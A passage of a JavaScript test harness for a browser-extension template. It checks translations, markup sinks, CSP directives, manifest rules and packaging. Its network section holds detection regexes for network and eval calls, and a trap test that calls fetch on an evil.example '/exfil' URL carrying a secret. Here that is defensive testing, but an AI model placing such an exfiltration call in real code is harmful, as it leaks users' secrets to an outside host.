        EN_KEYS.filter(passThrough).join(' ') + ')');

    check('every locale carries the source locale\'s exact key set',
      (() => {
        const bad = [];
        for (const c of codes) {
          const got = Object.keys(CAT.get(c) || {});
          if (got.length !== EN_KEYS.length || got.some((k, i) => k !== EN_KEYS[i])) bad.push(c);
        }
        return bad.length === 0;
      })(),
      codes.length + ' × ' + EN_KEYS.length + ' keys');

    /* ---- 1. no two catalogues are byte-identical ---- */
    const twins = [];
    const sameLangTwins = [];
    for (let i = 0; i < codes.length; i++) {
      for (let j = i + 1; j < codes.length; j++) {
        if (RAW.get(codes[i]) !== RAW.get(codes[j])) continue;
        const pair = codes[i] + '=' + codes[j];
        if (baseOf(codes[i]) === SOURCE && baseOf(codes[j]) === SOURCE) sameLangTwins.push(pair);
        else twins.push(pair);
      }
    }
    check('no two locale catalogues are byte-identical to each other',
      twins.length === 0,
      twins.length ? twins.slice(0, 8).join(' ') + (twins.length > 8 ? ' …' : '') + '  — one translation was copied into another language\'s folder, or neither was ever made'
        : (codes.length * (codes.length - 1) / 2) + ' pairs compared, all distinct' +
          (sameLangTwins.length ? '  (allowed and reported: ' + sameLangTwins.join(' ') + ' — variants of the source language)' : ''));

    /* ---- 2. every locale differs from English in MOST of its values ---- */
    /* THE CHECK THAT ACTUALLY WORKS. Not absolute: a brand, a glyph and the
       occasional word that a language genuinely shares with English are real,
       so the bar is a high proportion rather than every last string. */
    const thin = [];
    const scores = [];
    for (const c of codes) {
      if (c === SOURCE) continue;
      if (baseOf(c) === SOURCE) continue;                    // exemption 2
      const cat = CAT.get(c) || {};
      let differ = 0;
      for (const k of GRADED) {
        const m = cat[k] && cat[k].message;
        if (typeof m === 'string' && m !== EN[k].message) differ++;
      }
      const ratio = differ / GRADED.length;
      scores.push(c + ' ' + Math.round(ratio * 100) + '%');
      if (ratio < TRANSLATED_MIN) thin.push(c + ' ' + differ + '/' + GRADED.length + ' (' + Math.round(ratio * 100) + '%)');
    }
    check('every locale differs from English in MOST of its message VALUES',
      thin.length === 0,
      thin.length ? thin.length + ' locale(s) are still English: ' + thin.slice(0, 12).join(', ') + (thin.length > 12 ? ', …' : '')
        : scores.length + ' locales, all ≥ ' + Math.round(TRANSLATED_MIN * 100) + '% translated');

    /* ---- 3. every non-Latin locale is written in its own script ---- */
    /* A locale can differ from English in most values and still be wrong: a
       Devanagari catalogue with Latin transliteration in it, or a Hindi folder
       holding Marathi, both pass check 2. Presence of the language's own
       script is the cheapest true statement about the text itself. */
    const SCRIPTS = [
      ['am', /[ሀ-፿]/, 'Ethiopic'],
      ['ar', /[؀-ۿ]/, 'Arabic'],
      ['fa', /[؀-ۿ]/, 'Arabic (Persian)'],
      ['bg', /[Ѐ-ӿ]/, 'Cyrillic'],
      ['ru', /[Ѐ-ӿ]/, 'Cyrillic'],
      ['sr', /[Ѐ-ӿ]/, 'Cyrillic'],
      ['uk', /[Ѐ-ӿ]/, 'Cyrillic'],
      ['bn', /[ঀ-৿]/, 'Bengali'],
      ['el', /[Ͱ-Ͽ]/, 'Greek'],
      ['gu', /[઀-૿]/, 'Gujarati'],
      ['he', /[֐-׿]/, 'Hebrew'],
      ['hi', /[ऀ-ॿ]/, 'Devanagari'],
      ['mr', /[ऀ-ॿ]/, 'Devanagari'],
      ['ja', /[぀-ヿ]/, 'kana'],
      ['kn', /[ಀ-೿]/, 'Kannada'],
      ['ko', /[가-힯]/, 'Hangul'],
      ['ml', /[ഀ-ൿ]/, 'Malayalam'],
      ['ta', /[஀-௿]/, 'Tamil'],
      ['te', /[ఀ-౿]/, 'Telugu'],
      ['th', /[฀-๿]/, 'Thai'],
      ['zh', /[一-鿿]/, 'Han']
    ];
    const scriptOf = c => SCRIPTS.find(s => s[0] === baseOf(c));
    const wrongScript = [];
    let scripted = 0;
    for (const c of codes) {
      const spec = scriptOf(c);
      if (!spec) continue;
      scripted++;
      const cat = CAT.get(c) || {};
      let hits = 0;
      for (const k of GRADED) {
        const m = cat[k] && cat[k].message;
        if (typeof m === 'string' && spec[1].test(m)) hits++;
      }
      if (hits / GRADED.length < SCRIPT_MIN) {
        wrongScript.push(c + ' ' + hits + '/' + GRADED.length + ' in ' + spec[2]);
      }
    }
    check('every non-Latin locale is written in its own script',
      wrongScript.length === 0 && scripted >= 20,
      wrongScript.length ? wrongScript.slice(0, 12).join(', ') + (wrongScript.length > 12 ? ', …' : '')
        : scripted + ' non-Latin locales, each ≥ ' + Math.round(SCRIPT_MIN * 100) + '% in its own script');

    /* ---- 4. the value carried the machinery with it ---- */
    /* Placeholder parity and tag leakage are checked by the generator too. They
       are restated here because this file is the gate a copied tool runs, and
       because a tool that deletes the generator must not thereby delete the
       assertion that $COUNT$ still exists in Tamil. */
    const brokenPh = [];
    const leaked = [];
    const names = s => (String(s).match(/\$[A-Za-z0-9_]+\$/g) || []).map(x => x.toUpperCase()).sort().join(',');
    for (const c of codes) {
      const cat = CAT.get(c) || {};
      for (const k of EN_KEYS) {
        const m = cat[k] && cat[k].message;
        if (typeof m !== 'string') continue;
        if (names(m) !== names(EN[k].message)) brokenPh.push(c + '/' + k);
        if (/^\s*\[(privacy|permission)\]/.test(m)) leaked.push(c + '/' + k);
      }
    }
    check('every placeholder survived into every locale, exactly once',
      brokenPh.length === 0, brokenPh.slice(0, 8).join(' ') || 'all $PLACEHOLDER$ inventories match en');
    check('no [privacy]/[permission] tag leaked out of a description into a MESSAGE',
      leaked.length === 0, leaked.slice(0, 8).join(' ') || 'tags stayed in the English descriptions');

    /* ---- 5. the back-translation negation gate ---- */
    /* Shelled out rather than reimplemented: --self-test runs the polarity
       checker against fixtures with a known answer, which is the only way to
       know the gate BITES rather than merely runs. */
    {
      const { spawnSync } = require('child_process');
      const gen = path.join(H.ROOT, '_locales', 'make-locales.mjs');
      const st = spawnSync(process.execPath, [gen, '--self-test'], { encoding: 'utf8' });
      const out = String(st.stdout || '') + String(st.stderr || '');
      check('the back-translation negation checker still bites (--self-test)',
        st.status === 0 && /ALL PASS/.test(out) && /DROPPED negation is a hard flag/.test(out),
        out.trim().split('\n').filter(l => /^FAIL/.test(l)).join(' | ') ||
          (out.match(/^\d+ checks$/m) || ['?'])[0] + ' fixtures, all as expected');

      /* And the round trips exist for every locale in the claim set. The claim
         set is PARSED OUT OF the generator rather than copied to here, so
         adding a seventh claim puts it under this check automatically. */
      const genSrc = H.readRoot('_locales/make-locales.mjs');
      const decl = /const BACKTRANSLATED_CLAIMS = \[([\s\S]*?)\]/.exec(genSrc);
      const claims = decl ? (decl[1].match(/'([^']+)'/g) || []).map(s => s.slice(1, -1)) : [];
      let back = null;
      try { back = JSON.parse(H.readRoot('_locales/backtranslations.json')); } catch (_) { back = null; }
      const holes = [];
      for (const c of codes) {
        if (baseOf(c) === SOURCE) continue;
        const cat = CAT.get(c) || {};
        for (const k of claims) {
          const m = cat[k] && cat[k].message;
          if (typeof m !== 'string' || m === EN[k].message) continue;   // untranslated: nothing to verify
          const b = back && back[c] && back[c][k];
          if (typeof b !== 'string' || !b.trim()) holes.push(c + '/' + k);
        }
      }
      check('every privacy claim that was translated has a round trip on record',
        claims.length >= 5 && holes.length === 0,
        holes.length ? holes.length + ' missing: ' + holes.slice(0, 8).join(' ') + (holes.length > 8 ? ' …' : '')
          : claims.length + ' claims × ' + (codes.length - 4) + ' locales in _locales/backtranslations.json');

      /* The whole generator, run for real: the destructive guard, the staleness
         gate, the placeholder gate and the negation polarity of every recorded
         round trip, over the tree as it stands. --check writes nothing. */
      const chk = spawnSync(process.execPath, [gen, '--check'], { encoding: 'utf8' });
      const cout = String(chk.stdout || '') + String(chk.stderr || '');
      check('the generator agrees the tree is exactly what it would write (--check)',
        chk.status === 0 && /ALL PASS/.test(cout),
        cout.split('\n').filter(l => /^(FAIL|DRIFT|REFUSED)/.test(l)).slice(0, 6).join(' | ') ||
          (cout.match(/^translated .*$/m) || ['ok'])[0].trim());
    }
  });

  await runSection('sink', async () => {
    const SRC = H.readShipped(['.js']);
    const files = Array.from(SRC.keys());
    check('the static scan found every shipped script', files.length >= 6, files.join(' '));

    /* The reference's check, and the reason it is worded around a DOT: the
       comments in this family talk ABOUT innerHTML constantly. `.innerHTML` is
       member access — code — and cannot be produced by prose. */
    const concat = H.scanSource(/\.innerHTML\s*=[^;]*\+/, ['.js']);
    check('no controller builds markup by concatenation', concat.length === 0, concat.join(' | ') || 'none');

    const anyMarkup = H.scanSource(/\.(innerHTML|outerHTML)\b|insertAdjacentHTML\s*\(|document\.write\s*\(/, ['.js', '.html']);
    check('there is ZERO markup-sink usage anywhere in shipped code', anyMarkup.length === 0, anyMarkup.join(' | ') || 'none');

    const dyn = H.scanSource(/\beval\s*\(|\bnew\s+Function\s*\(|setTimeout\s*\(\s*['"]|setInterval\s*\(\s*['"]/, ['.js', '.html']);
    check('no eval, no new Function, no string-bodied timer', dyn.length === 0, dyn.join(' | ') || 'none');

    /* The reference words this as "the renderer renders text through
       textContent". This family goes one better: NO controller says textContent
       at all, because el()/elText() say it for them — so there is exactly ONE
       place in the folder where text meets the DOM. That is the invariant worth
       pinning, and it is stronger than the original: a second file that starts
       assigning textContent is a second door, and the next one somebody opens
       will be innerHTML. (Written after the first run of this sim reported a red
       on `/textContent/.test(popup.js)` — the check was wrong, the code was
       right. A red that turns out to be the test's fault is still worth the
       run; a green that was never observed to fail is not worth anything.) */
    const textAssigners = [];
    for (const [rel, src] of SRC) if (/\.textContent\s*=/.test(src)) textAssigners.push(rel);
    check('exactly ONE shipped file assigns textContent — every other file goes through el()/elText()',
      textAssigners.length === 1 && textAssigners[0] === 'pages/common.js', textAssigners.join(' ') || 'none');

    for (const f of ['popup/popup.js', 'pages/options.js']) {
      const src = SRC.get(f);
      const helpers = (src.match(/\b(elText|elClear|elAppend|elLink|el)\s*\(/g) || []).length;
      check(f + ' puts text on screen only through the el()/elText() helpers',
        helpers > 0 && !/\.(innerHTML|outerHTML)\b/.test(src) && !/insertAdjacentHTML/.test(src),
        helpers + ' helper calls, 0 markup sinks');
    }
    const commonSrc = SRC.get('pages/common.js');
    const commonSinks = (commonSrc.match(/\.(innerHTML|outerHTML)\b|insertAdjacentHTML/g) || []).length;
    check('pages/common.js is where textContent lives, and it has no markup sink of its own',
      /textContent/.test(commonSrc) && commonSinks === 0,
      (commonSrc.match(/\.textContent\s*=/g) || []).length + ' textContent assignments, ' + commonSinks + ' markup sinks');

    const bgSrc = SRC.get('background.js');

    /* The two gates, asserted as SHAPE. A gate that starts returning a piece of
       its argument stops being a gate, and that is not visible from outside. */
    check('humanReason returns a table value or the generic sentence — never its argument',
      /function humanReason\([^)]*\)\s*\{\s*const hit = knownReason\(raw\);\s*return hit \? hit\.human : R_GENERIC;\s*\}/.test(bgSrc),
      'GATE 1 shape intact');
    check('wireReason returns a table value or the generic sentence — never its argument',
      /function wireReason\([^)]*\)\s*\{\s*const hit = knownReason\(raw\);\s*return hit \? hit\.wire : R_GENERIC;\s*\}/.test(bgSrc),
      'GATE 2 shape intact');
    check('the response gate refuses to stringify a non-string error',
      /typeof r\.error === 'string' \? wireReason\(r\.error\) : R_GENERIC/.test(bgSrc),
      'a foreign object never reaches wireReason, so its toString never runs');
    check('every parked note gets its reason from humanReason',
      /reason: humanReason\(message\)/.test(bgSrc), 'recordError is the only note builder');
    check('the note is parked in storage.session and nowhere else',
      /chrome\.storage\.session\.set\(\{ \[LAST_ERROR_KEY\]/.test(bgSrc) &&
      !/chrome\.storage\.(local|sync)\.set\(\{ \[LAST_ERROR_KEY\]/.test(bgSrc),
      'session only');
    check('no reason is built by concatenating the raw text',
      !/R_GENERIC\s*\+|humanReason\([^)]*\)\s*\+\s*raw|hit\.human\s*\+/.test(bgSrc), 'no concatenation in the gates');

    /* Cross-file constants. TEMPLATE.md 2.4 says these two must match; a check
       is cheaper than the bug, which is a popup that silently never shows a
       parked failure. */
    const bgKey = /LAST_ERROR_KEY = '([^']+)'/.exec(bgSrc);
    const popKey = /LAST_ERROR_KEY = '([^']+)'/.exec(SRC.get('popup/popup.js'));
    check('LAST_ERROR_KEY matches between background.js and popup/popup.js',
      !!bgKey && !!popKey && bgKey[1] === popKey[1],
      (bgKey && bgKey[1]) + ' vs ' + (popKey && popKey[1]));

    const actions = JSON.parse('[' + (/const ACTIONS = \[([^\]]+)\]/.exec(bgSrc) || [, ''])[1].replace(/'/g, '"') + ']');
    const labels = SRC.get('popup/popup.js');
    const unlabelled = actions.filter(a => labels.indexOf("'" + a + "'") < 0);
    check('every action in ACTIONS has a label in popup.js',
      actions.length > 0 && unlabelled.length === 0, unlabelled.length ? 'missing: ' + unlabelled.join(',') : actions.join(','));

    /* Protocol: every message a page sends has a case, and every case is sent. */
    const cases = new Set((bgSrc.match(/case '([A-Z][A-Z0-9_]+)'/g) || []).map(s => s.slice(6, -1)));
    const sent = new Set();
    for (const f of ['popup/popup.js', 'pages/options.js']) {
      for (const m of (SRC.get(f).match(/type: '([A-Z][A-Z0-9_]+)'/g) || [])) sent.add(m.slice(7, -1));
    }
    const orphanSends = Array.from(sent).filter(t => !cases.has(t));
    check('every message type a page sends has a case in the router',
      orphanSends.length === 0, orphanSends.length ? 'no case for: ' + orphanSends.join(',') : Array.from(sent).join(','));
    check('the router declares at least one case per shipped action',
      cases.size >= sent.size && cases.size > 0, Array.from(cases).join(','));

    /* Settings ↔ options.html ↔ options.js, the drift this family pays for. */
    const { bg } = boot();
    const keys = Object.keys(bg.sandbox.SK_DEFAULTS);
    const optHtml = H.readRoot('pages/options.html');
    const optJs = SRC.get('pages/options.js');
    /* Not every key is a preference: skPersistAsked is bookkeeping the user
       never sets. The exception is DECLARED (SK_INTERNAL_KEYS) rather than
       silently tolerated, so this check can still tell "deliberately internal"
       from "somebody added a preference and forgot the row" — which is the
       drift it exists to catch, and which an undeclared exception would hide. */
    const internal = bg.sandbox.SK_INTERNAL_KEYS || [];
    const userKeys = keys.filter(k => internal.indexOf(k) < 0);
    const strayInternal = internal.filter(k => keys.indexOf(k) < 0);
    check('every INTERNAL key is a real settings key, not a name nobody uses',
      strayInternal.length === 0, strayInternal.join(',') || internal.join(',') || 'none declared');
    const shownInternal = internal.filter(k => optHtml.indexOf('id="' + k + '"') >= 0);
    check('an internal key has NO control on the options page — that is what makes it internal',
      shownInternal.length === 0, shownInternal.join(',') || 'none rendered');
    const noRow = userKeys.filter(k => optHtml.indexOf('id="' + k + '"') < 0);
    const noField = userKeys.filter(k => !new RegExp('\\b' + k + '\\s*:\\s*\'(checked|value|number)\'').test(optJs));
    check('every user-facing settings key has a row in options.html', noRow.length === 0, noRow.length ? 'missing: ' + noRow.join(',') : userKeys.join(','));
    check('every user-facing settings key has a FIELDS entry in options.js', noField.length === 0, noField.length ? 'missing: ' + noField.join(',') : userKeys.length + '/' + userKeys.length);

    /* THE ONE CHECK THAT HAS TO BE TRUE IN TWO DIFFERENT WORLDS.

       It used to assert, flatly, that at least fifteen PLACEHOLDER tags exist
       in shipped source — while TEMPLATE §10 and publish/preflight.mjs demand
       that NONE survive. Those cannot both be satisfied, so the inherited test
       tier went red on the first correctly specialised tool, and the cheapest
       repair available to whoever was holding it at the time was to delete the
       failing check. That is how the sink and allowlist checks — the two rules
       this family has actually paid for — get deleted as collateral.

       A test suite that is red on day one of every tool teaches 67 authors that
       reds are negotiable. So the check knows which world it is in. The
       skeleton (publish/identity.json still says slug "skeleton") must carry
       every edit point, because 67 copies will be produced by grepping for
       them and a renamed tag is a silently skipped step. A specialised tool
       must carry none. There is no third state, and no file to remember to
       delete. */
    const tags = new Set();
    for (const [, src] of H.readShipped(['.js', '.css', '.html'])) {
      for (const m of (src.match(/PLACEHOLDER\(([a-z-]+)\)/g) || [])) tags.add(m.slice(12, -1));
    }
    let slug = '';
    try { slug = String(JSON.parse(H.readRoot('publish/identity.json')).slug || ''); } catch (_) {}
    const isSkeleton = slug === 'skeleton';
    const REQUIRED = ['the-work', 'reasons', 'settings', 'prefix', 'abort', 'diagnostic', 'filename'];
    const missing = REQUIRED.filter(t => !tags.has(t));

    /* WHY A TOOL IS NOT FAILED FOR STILL HAVING TAGS.

       The previous shape demanded zero tags the instant the slug changed. But
       TEMPLATE §1 says to set the identity BEFORE any code, and there are 29
       tags to work through, so that rule made the node tier red from the first
       afternoon until the last — the whole build. It fixed "red on day one" by
       moving it to "red on days two through ninety", which teaches the same
       lesson: that a red is the normal state and can be ignored.

       Completion is not this tier's question. `node publish/preflight.mjs`
       owns "am I finished?", it is red by design until you are, and it already
       grades every surviving tag. Here a tool gets a COUNT it can watch fall,
       and the tier stays honest — so a real red still means something. */
    if (isSkeleton) {
      check('THE SKELETON: every edit point TEMPLATE.md promises is still findable',
        tags.size >= 15 && missing.length === 0,
        tags.size + ' distinct tags' +
          (missing.length ? ' — MISSING: ' + missing.join(' ') : ': ' + Array.from(tags).sort().join(' ')));
      check('and the two answers cannot both be demanded at once — preflight and the sim agree on which world this is',
        tags.size > 0, 'slug "skeleton" -> tags required here, and preflight is not yet asking');
    } else {
      /* A note, not a check. A check whose condition is a constant cannot fail,
         and a suite padded with those is how a green run stops meaning
         anything — the same defect as an assertion whose filter has quietly
         become an empty set. The real gate is preflight. */
      note(tags.size === 0
        ? 'a specialised tool (' + slug + '): every edit point is made'
        : 'a specialised tool (' + slug + '): ' + tags.size + ' edit point(s) still open — ' +
          Array.from(tags).sort().join(' '));
      note('  completeness is graded by `node publish/preflight.mjs`, which is red until you are done.');
    }
  });

  await runSection('network', async () => {
    /* Static, in the shape prose cannot produce. background.js's banner says
       "No fetch, no XHR, no WebSocket, no sendBeacon" — an assertion written
       against the WORDS would be red on the comment that promises they are
       absent, which is the definition of a check that does not bite. */
    const jsHits = H.scanSource(/\bfetch\s*\(|\bnew\s+XMLHttpRequest\b|\bnew\s+WebSocket\b|\bnew\s+EventSource\b|\.sendBeacon\s*\(|navigator\.connection/, ['.js']);
    check('no shipped script calls fetch, XHR, WebSocket, EventSource or sendBeacon',
      jsHits.length === 0, jsHits.join(' | ') || 'none');

    const remoteImport = H.scanSource(/importScripts\s*\(\s*['"]https?:|import\s*\(\s*['"]https?:|from\s+['"]https?:/, ['.js']);
    check('nothing is imported from a url', remoteImport.length === 0, remoteImport.join(' | ') || 'none');

    const remoteAsset = H.scanSource(/(src|href)\s*=\s*["']https?:|url\(\s*["']?https?:|@import\s+(url\()?["']https?:/, ['.html', '.css']);
    check('no html or css loads a remote script, font, stylesheet or image',
      remoteAsset.length === 0, remoteAsset.join(' | ') || 'none');

    const manifest = JSON.parse(H.readRoot('manifest.json'));
    check('the manifest declares no externally_connectable and no remote CSP',
      !manifest.externally_connectable &&
      !JSON.stringify(manifest.content_security_policy || {}).match(/https?:/),
      JSON.stringify(manifest.content_security_policy || 'no CSP override'));

    /* ================================================================
       THE PLATFORM ENFORCES THE PROMISE, NOT JUST THE GREP
       ================================================================
       Everything above this line is a scan of the source. A scan cannot see the
       line a tool adds next year, and the MV3 DEFAULT policy constrains almost
       nothing: it is `script-src 'self'; object-src 'self'` and says nothing at
       all about img-src, connect-src, style-src, frame-src, base-uri or
       form-action.

       This family has already paid for that gap once. A pasted url reached
       innerHTML in the reference implementation; the default CSP blocked the
       script half so no code ran — and the surviving `<img src=https://evil…>`
       made a real outbound request from an extension page, out of a product
       whose entire listing claim is that it makes none. The retro's own words:
       a CSP that blocks script execution is not a reason to leave an injection
       unfixed.

       "Never write markup" is one gate. This is the second, and it is the one
       that is still standing after somebody writes markup anyway. */
    const csp = String((manifest.content_security_policy || {}).extension_pages || '');
    const directive = name => {
      const m = new RegExp('(?:^|;)\\s*' + name + '\\s+([^;]+)').exec(csp);
      return m ? m[1].trim() : null;
    };
    check('the manifest declares content_security_policy.extension_pages at all',
      csp !== '', csp || 'ABSENT — the MV3 default constrains script-src and object-src and nothing else');
    check('connect-src is \'none\' — the zero-network promise is ENFORCED, not asserted',
      directive('connect-src') === "'none'",
      'connect-src ' + directive('connect-src') + ' — fetch, XHR, WebSocket and sendBeacon all fail at the platform layer');
    check('img-src admits no remote host, so an injected <img> cannot become a beacon',
      /^'self'(\s+(data:|blob:))*$/.test(String(directive('img-src'))),
      'img-src ' + directive('img-src') + ' — this is the exact hole the reference shipped');
    check('style-src has no \'unsafe-inline\' — an injected style= or <style> is refused',
      directive('style-src') === "'self'", 'style-src ' + directive('style-src'));
    check('object-src, frame-src and child-src are \'none\' — nothing may be embedded',
      ['object-src', 'frame-src', 'child-src'].every(d => directive(d) === "'none'"),
      ['object-src', 'frame-src', 'child-src'].map(d => d + ' ' + directive(d)).join('; '));
    check('base-uri and form-action are \'none\' — an injected <base> or <form> goes nowhere',
      directive('base-uri') === "'none'" && directive('form-action') === "'none'",
      'base-uri ' + directive('base-uri') + '; form-action ' + directive('form-action'));
    check('the policy names no scheme a network request could travel over',
      !/https?:|wss?:|\*/.test(csp.replace(/data:|blob:/g, '')), csp);
    check('nothing in the policy re-enables eval',
      !/unsafe-eval|wasm-unsafe-eval/.test(csp), "no 'unsafe-eval'");

    /* style-src 'self' is only keepable if nothing shipped needs inline CSS.
       This is the check that stops somebody adding a <style> block and then
       "fixing" the resulting blank page by putting 'unsafe-inline' back. */
    const inlineStyle = [], styleAttr = [];
    for (const [name, src] of H.readShipped(['.html'])) {
      const bare = stripHtmlComments(src);
      if (/<style[\s>]/i.test(bare)) inlineStyle.push(name);
      if (/\sstyle\s*=\s*["']/i.test(bare)) styleAttr.push(name);
    }
    check('no shipped page carries a <style> block — the CSP would refuse it',
      inlineStyle.length === 0, inlineStyle.join(', ') || 'every page links a stylesheet file');
    check('no shipped page carries a style="" attribute either',
      styleAttr.length === 0, styleAttr.join(', ') || 'none');

    /* ================================================================
       THREE DEFAULT-DENY POSTURES THAT ARE ONE LINE FROM BEING LOST
       ================================================================
       Each is safe today only because nobody has written the line, and each is
       a line a tool author has a plausible reason to write. */
    const war = manifest.web_accessible_resources || [];
    const wide = war.filter(w => (w.matches || []).some(m => /<all_urls>|^\*:\/\/\*\/|^\*:\/\/\*$/.test(m)));
    check('web_accessible_resources exposes nothing to every site',
      wide.length === 0,
      war.length === 0
        ? 'none declared — the extension id is not broadcast to every page the user visits'
        : 'EXPOSED TO ALL: ' + JSON.stringify(wide));
    check('any web_accessible_resources entry uses a dynamic url, so it is not an install fingerprint',
      war.every(w => w.use_dynamic_url === true), war.length ? JSON.stringify(war) : 'n/a — none declared');

    const accessLevel = H.scanSource(/setAccessLevel\s*\(/, ['.js']);
    check('nothing calls storage.session.setAccessLevel — the parked note stays out of reach of page code',
      accessLevel.length === 0,
      accessLevel.join(' | ') || 'TRUSTED_CONTEXTS is the default and the right answer');

    /* Runtime. A whole worker lifecycle plus both pages, and the trap stayed
       quiet. */
    const { chrome, bg } = boot();
    await bg.send({ type: 'SK_TAB_INFO', tabId: 1 });
    await bg.send({ type: 'SK_TAB_INFO', tabId: 2 });
    await bg.send({ type: 'SK_CLEAR_DATA' });
    bg.fire('runtime.onStartup');
    await tick(6);
    const dom = H.makeDom({ html: ['popup/popup.html'] });
    const page = H.loadPage(['lib/settings.js', 'pages/common.js', 'popup/popup.js'], { chrome, idb: bg.idb, dom });
    await tick(10);
    check('the runtime network trap recorded nothing from the worker or the popup',
      bg.net.length === 0 && page.net.length === 0,
      JSON.stringify(bg.net.concat(page.net).map(v => v.api)));

    /* A trap that has never fired is a trap nobody has seen work. */
    let trapped = false, trapRecord = null;
    const probe = [];
    const sandbox = { console };
    H.installNetworkTrap(sandbox, probe);
    try { sandbox.fetch('https://evil.example/exfil?d=' + SECRET); } catch (e) { trapped = /NETWORK TRAP/.test(e.message); }
    trapRecord = probe.length === 1 && probe[0].api === 'fetch';
    check('the network trap itself bites: fetch() throws AND is recorded',
      trapped && trapRecord, probe.map(p => p.api + '(' + p.arg.slice(0, 28) + '…)').join(' '));
    let xhrTrapped = false;
    try { new sandbox.XMLHttpRequest(); } catch (e) { xhrTrapped = /NETWORK TRAP/.test(e.message); }
    let wsTrapped = false;
    try { new sandbox.WebSocket('wss://evil.example'); } catch (e) { wsTrapped = /NETWORK TRAP/.test(e.message); }
    let beaconTrapped = false;
    try { H.makeDom({}).navigator.sendBeacon('https://evil.example'); } catch (e) { beaconTrapped = /NETWORK TRAP/.test(e.message); }
    check('XHR, WebSocket and sendBeacon are trapped too',
      xhrTrapped && wsTrapped && beaconTrapped,
      'XHR=' + xhrTrapped + ' WS=' + wsTrapped + ' beacon=' + beaconTrapped);
  });

  await runSection('manifest', async () => {
    const raw = H.readRoot('manifest.json');
    let m = null, parseErr = '';
    try { m = JSON.parse(raw); } catch (e) { parseErr = e.message; }
    check('manifest.json parses', !!m, parseErr || 'ok');

    /* THE STORE'S UPLOAD RULES, RUN AGAINST THE WORKING TREE.
       Not re-implemented here: manifestGates() is the same exported function
       publish/pack.mjs runs against the PACKAGED manifest, so the tree and the
       archive are graded by one implementation. A second copy living in the sim
       is a copy that can pass while the real one fails, which is precisely the
       shape of bug the packaging tier exists to prevent.
       Every gate in it is something an upload is REJECTED for. */
    const cats = {};
    for (const code of fs.readdirSync(path.join(H.ROOT, '_locales'), { withFileTypes: true })) {
      if (!code.isDirectory()) continue;
      const p = path.join(H.ROOT, '_locales', code.name, 'messages.json');
      if (fs.existsSync(p)) cats[code.name] = JSON.parse(fs.readFileSync(p, 'utf8'));
    }
    const listing = fs.existsSync(path.join(H.ROOT, 'publish/STORE-LISTING.md'))
      ? fs.readFileSync(path.join(H.ROOT, 'publish/STORE-LISTING.md'), 'utf8') : null;
    check('publish/STORE-LISTING.md exists, so a permission can be justified somewhere',
      listing !== null, listing ? 'found' : 'MISSING — the §10 line about justifications is unfalsifiable without it');
    for (const g of PUB.manifestGates(m, { catalogues: cats, hasLocales: Object.keys(cats).length > 0, storeListing: listing })) {
      check(g.label, g.ok, g.extra);
    }
    check('the store gates actually ran against 55 catalogues, not against the __MSG_ placeholder',
      Object.keys(cats).length >= 55 && /^__MSG_/.test(String(m.description)),
      Object.keys(cats).length + ' catalogues; description resolves through them, so a 200-char German ' +
      'string is red rather than a 22-char placeholder passing');

    const referenced = [
      m.background && m.background.service_worker,
      m.action && m.action.default_popup,
      m.options_page || (m.options_ui && m.options_ui.page)
    ].concat(Object.values(m.icons || {}))
      .concat(Object.values((m.action && m.action.default_icon) || {}))
      .filter(Boolean);
    const missing = referenced.filter(f => !H.existsRoot(f));
    check(referenced.length + ' files referenced by the manifest all exist on disk',
      missing.length === 0, missing.join(', ') || referenced.join(' '));

    check('the manifest references nothing under test/',
      raw.indexOf('test/') < 0, 'test code is not shipped');

    /* Was "the service worker is a classic script (importScripts works)" — a
       green check that CERTIFIED the shape that kills the add-on in Firefox,
       which runs background.js as an event-page script where importScripts is
       undefined. The portable requirement is both halves: not a module, AND
       guarded. */
    const bgCode = PUB.stripComments(H.readRoot('background.js'));
    const guardAt = bgCode.search(/if\s*\(\s*typeof\s+importScripts\s*[!=]==?\s*['"]function['"]\s*\)/);
    const firstCall = bgCode.indexOf('importScripts(');
    check('the worker is a classic script AND every importScripts call is guarded',
      !(m.background && m.background.type === 'module') && (firstCall < 0 || (guardAt >= 0 && guardAt < firstCall)),
      firstCall < 0 ? 'no importScripts at all'
        : 'guard at ' + guardAt + ', first call at ' + firstCall + ' — the same file runs in both engines');
  });

  /* ---------------------------------------------------------------- */
  /* publish — the artifact a reviewer actually receives               */
  /* ---------------------------------------------------------------- */
  /* Everything else in this sim grades the FOLDER. Nobody outside this machine
     will ever see the folder. This section grades the machinery that turns it
     into the thing they do see, and it grades the machinery by RUNNING it —
     collect() and writeZip() and verifyPackage() are the same functions
     publish/pack.mjs calls, driven here against a real archive written to a
     temp directory. A packaging script nothing exercises is a packaging script
     that breaks on submission day. */
  await runSection('publish', async () => {
    const os = require('os');

    const TOOLCHAIN = ['pack.mjs', 'verify-package.node.js', 'verify-firefox-package.node.js',
      'bump-version.mjs', 'preflight.mjs', 'shots.mjs', 'identity.json', 'manifest.firefox.json',
      'PRIVACY-POLICY.html', 'STORE-LISTING.md', 'COMPLIANCE-CHECKLIST.md', 'SUBMISSION.md'];
    const absent = TOOLCHAIN.filter(f => !H.existsRoot('publish/' + f));
    check('the publish/ toolchain is all present',
      absent.length === 0, absent.length ? 'MISSING: ' + absent.join(', ') : TOOLCHAIN.length + ' files');

    /* ---- PROVENANCE ----
       The moment tool #2 exists there are two copies of test/harness.js, and
       nothing answers "which tools have the fixed version?" The reference
       proves the cost: its packaging script shipped with a lexical-sort bug
       that was found one session later and fixed in exactly one place — under
       a copy-the-folder model that fix reaches one tool out of 67, and nothing
       records which one. Retro-stamping is guesswork, because by then the
       copies have diverged for real reasons and accidental ones and telling
       them apart means reading 1,600 lines of test code per tool. */
    let stamp = null;
    try { stamp = JSON.parse(H.readRoot('skeleton.json')); } catch (_) {}
    check('skeleton.json stamps a version, so a copy can be traced back to what it came from',
      !!stamp && /^\d+\.\d+\.\d+$/.test(String(stamp.skeletonVersion)),
      stamp ? 'v' + stamp.skeletonVersion : 'MISSING');
    check('the harness reads that version rather than carrying a second copy of it',
      !!stamp && H.SKELETON_VERSION === stamp.skeletonVersion &&
      /skeleton\.json/.test(stripJsComments(H.readRoot('test/harness.js'))),
      'H.SKELETON_VERSION = ' + H.SKELETON_VERSION);
    check('and every sim run prints it, so a pasted result carries its own provenance',
      /skeleton v.*SKELETON_VERSION|SKELETON_VERSION/.test(stripJsComments(H.readRoot('test/harness.js'))),
      'in finish()');
    const inherited = (stamp && stamp.inherited) || [];
    const gone = inherited.filter(f => !H.existsRoot(f));
    check('every file skeleton.json calls INHERITED actually exists — a stale list audits nothing',
      inherited.length >= 10 && gone.length === 0,
      gone.length ? 'MISSING: ' + gone.join(', ') : inherited.length + ' files compared per tool');
